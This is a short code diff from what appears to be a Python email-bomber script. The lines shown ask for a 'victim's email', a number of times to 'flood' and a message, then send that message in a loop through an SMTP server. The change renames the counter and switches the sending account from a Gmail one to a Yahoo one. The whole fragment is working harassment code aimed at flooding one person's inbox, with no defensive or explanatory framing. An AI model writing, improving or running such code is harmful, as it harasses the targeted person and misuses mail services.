@@ -87,15 +87,15 @@ if eduask == 'Y':
 				victimem = raw_input("Please enter your victim's email: ")
 
 				print("Enter number of times you want to flood")
-				countnum= int(raw_input("Count : "))
+				countnum2= int(raw_input("Count : "))
 				
 
 				msge = raw_input("Enter your message:\n")
 				
 				
 
-				for count in range(int(countnum)):
-					server.sendmail(gmail,victimem,msge)
+				for count in range(int(countnum2)):
+					server.sendmail(yahoomail,victimem,msge)
 					print (count,"Messages sent! ")
 
 
